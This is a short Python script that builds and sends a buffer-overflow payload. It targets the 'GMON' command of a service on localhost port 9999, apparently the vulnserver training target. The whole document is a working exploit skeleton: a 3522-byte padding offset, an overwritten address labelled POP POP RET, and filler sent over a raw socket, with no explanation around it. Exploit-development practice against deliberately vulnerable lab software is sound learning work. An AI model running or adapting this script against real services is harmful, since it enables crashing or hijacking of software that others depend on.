import socket
import struct
import os
import sys

target_command = "GMON /"
offset = 3522
eip = struct.pack("<I", 0x6250172b)     # POP POP RET

payload = ""
payload += target_command
payload += "A" * (offset)
payload += eip
payload += "C" * (4103 - offset - len(eip))

print "[+] Sending buffer (Size: %d)" % len(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
print(s.recv(1024))
s.send(payload)
s.close() 
